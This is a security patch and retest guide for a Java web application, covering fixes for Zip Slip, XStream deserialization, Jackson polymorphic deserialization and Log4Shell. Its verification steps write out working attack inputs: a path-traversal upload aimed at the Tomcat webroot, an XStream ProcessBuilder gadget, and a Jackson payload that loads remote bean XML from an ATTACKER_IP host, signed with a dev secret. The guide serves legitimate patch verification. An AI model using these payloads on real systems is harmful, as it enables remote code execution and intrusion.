# SIMIPKIT Security Patches & Verification Guide

This document summarizes the security patches applied to the `secure/patched-v1` branch of the SIMIPKIT project.

---

## Summary of Patches & Dependency Upgrades

| Vulnerability / Patch | CVE / Identifier | Dependency Change | Modified Files |
|---|---|---|---|
| **Patch 1: Zip Slip** | CVE-2018-1002202 | `net.lingala.zip4j:zip4j`<br>1.3.1 &rarr; **2.11.6** | [pom.xml](file:///c:/Users/abda/Desktop/WebApp/simipkit/pom.xml)<br>[DocumentBulkService.java](file:///c:/Users/abda/Desktop/WebApp/simipkit/src/main/java/com/happy/simipkit/service/DocumentBulkService.java)<br>[DocumentBulkController.java](file:///c:/Users/abda/Desktop/WebApp/simipkit/src/main/java/com/happy/simipkit/controller/DocumentBulkController.java) |
| **Patch 2: XStream RCE** | CVE-2013-7285 / CVE-2020-26217 | `com.thoughtworks.xstream:xstream`<br>1.4.10 &rarr; **1.4.20** | [pom.xml](file:///c:/Users/abda/Desktop/WebApp/simipkit/pom.xml)<br>[ReportTemplateController.java](file:///c:/Users/abda/Desktop/WebApp/simipkit/src/main/java/com/happy/simipkit/controller/ReportTemplateController.java)<br>[ReportLayoutConfig.java](file:///c:/Users/abda/Desktop/WebApp/simipkit/src/main/java/com/happy/simipkit/model/ReportLayoutConfig.java)<br>[ReportService.java](file:///c:/Users/abda/Desktop/WebApp/simipkit/src/main/java/com/happy/simipkit/service/ReportService.java) |
| **Patch 3: Jackson RCE** | App-Level Defect (No CVE) / CWE-502 | `com.fasterxml.jackson.core:jackson-databind`<br>2.9.8 &rarr; **2.17.2** | [pom.xml](file:///c:/Users/abda/Desktop/WebApp/simipkit/pom.xml)<br>[GatewayExtensionDeserializer.java](file:///c:/Users/abda/Desktop/WebApp/simipkit/src/main/java/com/happy/simipkit/deserializer/GatewayExtensionDeserializer.java)<br>[BankSyncService.java](file:///c:/Users/abda/Desktop/WebApp/simipkit/src/main/java/com/happy/simipkit/service/BankSyncService.java)<br>[AppConfig.java](file:///c:/Users/abda/Desktop/WebApp/simipkit/src/main/java/com/happy/simipkit/config/AppConfig.java)<br>[BankSyncController.java](file:///c:/Users/abda/Desktop/WebApp/simipkit/src/main/java/com/happy/simipkit/controller/BankSyncController.java)<br>[AuthenticationFilter.java](file:///c:/Users/abda/Desktop/WebApp/simipkit/src/main/java/com/happy/simipkit/security/AuthenticationFilter.java)<br>[.env.example](file:///c:/Users/abda/Desktop/WebApp/simipkit/.env.example)<br>[docker-compose.yml](file:///c:/Users/abda/Desktop/WebApp/simipkit/docker-compose.yml) |
| **Patch 4: Log4Shell** | CVE-2021-44228 | `org.apache.logging.log4j:log4j-core/api`<br>2.14.1 &rarr; **2.23.1** | [pom.xml](file:///c:/Users/abda/Desktop/WebApp/simipkit/pom.xml)<br>[Dockerfile](file:///c:/Users/abda/Desktop/WebApp/simipkit/Dockerfile)<br>[docker-compose.yml](file:///c:/Users/abda/Desktop/WebApp/simipkit/docker-compose.yml)<br>[AuditLogService.java](file:///c:/Users/abda/Desktop/WebApp/simipkit/src/main/java/com/happy/simipkit/service/AuditLogService.java)<br>[deploy/tomcat-setenv.sh](file:///c:/Users/abda/Desktop/WebApp/simipkit/deploy/tomcat-setenv.sh) |
| **General Build Configuration** | - | - | [.gitignore](file:///c:/Users/abda/Desktop/WebApp/simipkit/.gitignore) |

---

## Retest & Verification Steps (Ubuntu Deployment)

Below are the commands and configurations to manually verify the security posture of SIMIPKIT.

### 1. Verification for Zip Slip (CVE-2018-1002202)

- **Exploit Vector**: Attacking bulk KYC upload with zip files containing path traversal directory structures (`../../`).
- **Retest Steps**:
  1. Create a malicious ZIP containing a traversing path (e.g. `../../../../../opt/tomcat/webapps/ROOT/test.txt`).
  2. Upload the file to the bulk upload endpoint:
     ```bash
     curl -i -X POST http://localhost:8080/simipkit/documents/bulk-upload \
       -F "clientId=client123" \
       -F "zipFile=@malicious_kyc.zip"
     ```
  3. **Expected Result**:
     - The response should indicate an extraction failure (`500` or a clear validation exception stating path traversal was blocked).
     - The file `test.txt` **MUST NOT** be created in `/opt/tomcat/webapps/ROOT/` or outside the upload target directory.
     - Look up the DB table `audit_log`: a row with action `BULK_UPLOAD_PATH_TRAVERSAL_BLOCKED` must exist, containing only the base file name (e.g. `test.txt`) and excluding the raw path traversal payload (like `../`).

---

### 2. Verification for XStream Deserialization (CVE-2013-7285 / CVE-2020-26217)

- **Exploit Vector**: Uploading a layout template containing custom XML payloads manipulating JDK classes.
- **Retest Steps**:
  1. Submit the following XML payload to `/simipkit/report-template-upload` via the UI:
     ```xml
     <sorted-set>
       <string>foo</string>
       <dynamic-proxy>
         <interface>java.lang.Comparable</interface>
         <handler class="java.beans.EventHandler">
           <target class="java.lang.ProcessBuilder">
             <command>
               <string>touch</string>
               <string>/tmp/xstream-pwned</string>
             </command>
           </target>
           <action>start</action>
         </handler>
       </dynamic-proxy>
     </sorted-set>
     ```
  2. **Expected Result**:
     - The preview page will parse the layout using the XML DOM parser instead of XStream. It will fail with a parsing validation error (`Root element must be <reportTemplate>`) or succeed safely if it conforms to `<reportTemplate>`.
     - The target command (`touch /tmp/xstream-pwned`) **MUST NOT** be executed. No files will appear at `/tmp/xstream-pwned`.

---

### 3. Verification for Jackson Polymorphic Deserialization RCE (CWE-502)

- **Exploit Vector**: Sending unauthenticated payloads triggering deserialization of arbitrary classpath classes (e.g. Spring's XML-loading gadget).
- **Setup for Retest**:
  Ensure the environment variable `BANK_SYNC_SHARED_SECRET` is set in the `/etc/simipkit.env` file or Tomcat JVM arguments:
  ```bash
  export BANK_SYNC_SHARED_SECRET="dev-only-change-me-7f8a9b2c3d4e5f6a"
  ```
- **Retest Steps**:
  1. **Test Unsigned Request**:
     ```bash
     curl -i -X POST http://localhost:8080/simipkit/api/sync/bank-feed \
       -H "Content-Type: application/json" \
       -d '{
         "@class": "com.happy.simipkit.model.banksync.SaldoUpdateEvent",
         "bankPartnerCode": "BCA",
         "referenceNumber": "REF-1001"
       }'
     ```
     *Expected Result*: Returns `HTTP/1.1 401 Unauthorized` with error details. The DB table `audit_log` records a `BANK_FEED_SIGNATURE_REJECTED` action.
  
  2. **Compute Signature (Python Script)**:
     Use this Python script to calculate the signature for the exploit payload:
     ```python
     import hmac
     import hashlib

     secret = b"dev-only-change-me-7f8a9b2c3d4e5f6a"
     payload = b'''{
       "@class": "com.happy.simipkit.model.banksync.SaldoUpdateEvent",
       "bankPartnerCode": "BCA",
       "referenceNumber": "REF-1001",
       "gatewayExtensionData": {
         "@type": "org.springframework.context.support.ClassPathXmlApplicationContext",
         "configLocation": "http://ATTACKER_IP:8888/malicious-beans.xml"
       }
     }'''
     
     signature = hmac.new(secret, payload, hashlib.sha256).hexdigest()
     print("X-Signature Header Value:", signature)
     ```
  
  3. **Test Signed Request**:
     Execute the curl command with the calculated `X-Signature`:
     ```bash
     curl -i -X POST http://localhost:8080/simipkit/api/sync/bank-feed \
       -H "Content-Type: application/json" \
       -H "X-Signature: <calculated_signature_from_above>" \
       -d '{
         "@class": "com.happy.simipkit.model.banksync.SaldoUpdateEvent",
         "bankPartnerCode": "BCA",
         "referenceNumber": "REF-1001",
         "gatewayExtensionData": {
           "@type": "org.springframework.context.support.ClassPathXmlApplicationContext",
           "configLocation": "http://ATTACKER_IP:8888/malicious-beans.xml"
         }
       }'
     ```
     *Expected Result*:
     - Returns `HTTP/1.1 200 OK` (the signature matches, so the request is accepted).
     - The payload is deserialized successfully. However, `gatewayExtensionData` is bound to a standard Java `Map` structure. The class `ClassPathXmlApplicationContext` **is NOT instantiated**, meaning no JNDI/HTTP requests are sent to fetch `malicious-beans.xml`, and no commands are executed.

---

### 4. Verification for Log4Shell (CVE-2021-44228)

- **Exploit Vector**: Logging payload triggers JNDI lookup.
- **Setup for Retest**:
  1. Copy the reference file `deploy/tomcat-setenv.sh` to `/opt/tomcat/bin/setenv.sh` in the Ubuntu deployment:
     ```bash
     cp deploy/tomcat-setenv.sh /opt/tomcat/bin/setenv.sh
     chmod +x /opt/tomcat/bin/setenv.sh
     ```
  2. Restart Tomcat.
- **Retest Steps**:
  1. Trigger an action that writes to the audit log (such as trying to log in with username containing lookup payload, or uploading bulk files containing traversal characters).
  2. **Expected Result**:
     - System properties are set with `-Dlog4j2.formatMsgNoLookups=true`.
     - The upgraded Log4j `2.23.1` has format lookups disabled by default.
     - As a defense-in-depth layer, the `AuditLogService` sanitizes the data before logging: any instance of `${` will show as `$_{` in the output log files, preventing interpolation.
